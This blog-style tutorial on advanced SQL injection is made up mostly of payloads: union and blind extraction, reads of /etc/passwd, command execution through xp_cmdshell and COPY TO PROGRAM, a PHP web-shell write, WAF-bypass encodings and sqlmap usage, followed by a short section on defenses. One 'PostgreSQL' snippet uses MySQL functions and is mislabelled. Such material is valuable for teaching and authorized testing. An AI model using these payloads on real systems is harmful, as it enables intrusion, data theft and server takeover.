---
layout: post
title: "Advanced SQL Injection Techniques: From Union to Blind"
date: 2024-12-15 10:00:00 +0000
categories: [Web Security, Penetration Testing]
tags: [sql injection, web security, testing, databases]
---

# Advanced SQL Injection Techniques: From Union to Blind

SQL injection remains one of the most critical vulnerabilities in web applications today. In this comprehensive guide, we'll explore advanced techniques that go beyond basic injection and delve into sophisticated methods used by security professionals.

## Understanding SQL Injection Fundamentals

Before diving into advanced techniques, let's establish a solid foundation. SQL injection occurs when user input is improperly sanitized and directly concatenated into SQL queries, allowing attackers to manipulate the database logic.

### Basic Union-Based Injection

Union-based injection is often the first technique penetration testers learn:

```sql
' UNION SELECT 1,2,3,database()--
```

This payload reveals the current database name by leveraging the UNION operator to combine results from two queries.

## Advanced Union Techniques

### Column Number Discovery

When exploiting union-based injections, determining the number of columns is crucial:

```sql
' ORDER BY 10--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10--
```

Start with a high number and work your way down until the error disappears.

### Information Schema Exploitation

Once you've established the column count, extract valuable information:

```sql
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='target_db'--
```

## Blind SQL Injection Mastery

When applications don't display error messages or query results, blind injection techniques become essential.

### Boolean-Based Blind Injection

This technique relies on observing application behavior changes:

```sql
' AND (SELECT SUBSTRING(username,1,1) FROM users WHERE id=1)='a'--
```

If the page loads normally, the first character of the username is 'a'.

### Time-Based Blind Injection

When boolean-based techniques fail, time delays can reveal information:

```sql
'; IF (1=1) WAITFOR DELAY '00:00:05'--
' AND IF(1=1,SLEEP(5),0)--
```

These payloads cause observable delays when conditions are true.

## Database-Specific Techniques

### MySQL Exploitation

MySQL offers unique functions for advanced exploitation:

```sql
-- Version fingerprinting
' AND @@version LIKE '8%'--

-- File reading (requires FILE privilege)
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--

-- Writing web shells
' UNION SELECT 1,2,'<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL Advanced Features

PostgreSQL provides powerful functions for exploitation:

```sql
-- Command execution
'; COPY (SELECT '') TO PROGRAM 'id'--

-- Large object manipulation
' UNION SELECT 1,lo_import('/etc/passwd'),3--
```

### MSSQL Exploitation

Microsoft SQL Server has its own set of useful functions:

```sql
-- Command execution via xp_cmdshell
'; EXEC xp_cmdshell 'whoami'--

-- Reading files
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK '/windows/system32/drivers/etc/hosts', SINGLE_BLOB) AS t--
```

## Advanced Evasion Techniques

### WAF Bypass Methods

Modern applications often employ Web Application Firewalls (WAFs). Here are techniques to bypass common filters:

```sql
-- Comment variations
/*comment*/ /*!comment*/ #comment --comment

-- Case variations
UnIoN SeLeCt

-- Encoding techniques
%55%4e%49%4f%4e (URL encoding for UNION)
CHAR(85,78,73,79,78) (CHAR encoding for UNION)

-- Alternative operators
AND 1=1
&& 1=1
%26%26 1=1
```

### Function Alternatives

When common functions are blocked, alternatives often work:

```sql
-- Instead of SUBSTRING
MID(), LEFT(), RIGHT()

-- Instead of CONCAT
MAKE_SET(), ELT()

-- Instead of ASCII
ORD()
```

## Error-Based Injection

When applications display error messages, leverage them for data extraction:

### MySQL Error-Based Techniques

```sql
-- Using ExtractValue
' AND ExtractValue(1,CONCAT(0x7e,(SELECT database()),0x7e))--

-- Using UpdateXML  
' AND UpdateXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--
```

### PostgreSQL Error-Based

```sql
-- Casting errors
' AND CAST((SELECT version()) AS int)--

-- Array indexing errors
' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2) AS t GROUP BY CONCAT(user(),FLOOR(RAND()*2)))--
```

## Second-Order SQL Injection

Sometimes injection occurs in a different context than where payload is inserted:

1. Insert payload in registration form
2. Payload gets stored in database
3. Payload executes when data is retrieved and used in another query

```sql
-- Registration payload
admin'/*

-- Later executed as
SELECT * FROM users WHERE username='admin'/*' AND password='hash'
```

## NoSQL Injection Techniques

Modern applications often use NoSQL databases, which have their own injection vectors:

### MongoDB Injection

```javascript
// Authentication bypass
{"username": {"$ne": null}, "password": {"$ne": null}}

// Data extraction
{"username": {"$regex": "^admin"}}
```

## Automated Tools and Scripts

While manual testing is crucial, automation can speed up the process:

### SQLMap Usage

```bash
# Basic usage
sqlmap -u "http://target.com/page.php?id=1"

# Advanced options
sqlmap -u "target.com" --forms --crawl=2 --random-agent --batch --threads=5
```

### Custom Python Scripts

```python
import requests
import string
import time

def blind_sqli(url, injection_point):
    database_name = ""
    for position in range(1, 20):
        for char in string.ascii_lowercase + string.digits:
            payload = f"' AND (SELECT SUBSTRING(database(),{position},1))='{char}'--"
            # Test payload and check response
```

## Defense Strategies

Understanding attacks helps implement better defenses:

### Parameterized Queries

```python
# Vulnerable
query = f"SELECT * FROM users WHERE id = {user_id}"

# Secure
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
```

### Input Validation

```python
def validate_input(user_input):
    if not user_input.isdigit():
        raise ValueError("Invalid input")
    return int(user_input)
```

### Stored Procedures

```sql
CREATE PROCEDURE GetUser(@UserID INT)
AS
BEGIN
    SELECT * FROM Users WHERE ID = @UserID
END
```

## Conclusion

SQL injection attacks continue to evolve, and security professionals must stay current with new techniques and evasion methods. The key to successful exploitation often lies in understanding the underlying database technology and application logic.

Remember: These techniques should only be used in authorized penetration testing scenarios. Always obtain proper written permission before testing any systems you don't own.

## References

- OWASP SQL Injection Prevention Cheat Sheet
- PortSwigger Web Security Academy
- SQLMap Documentation
- Database-specific security documentation

Happy hunting, and remember to hack responsibly! 🔒
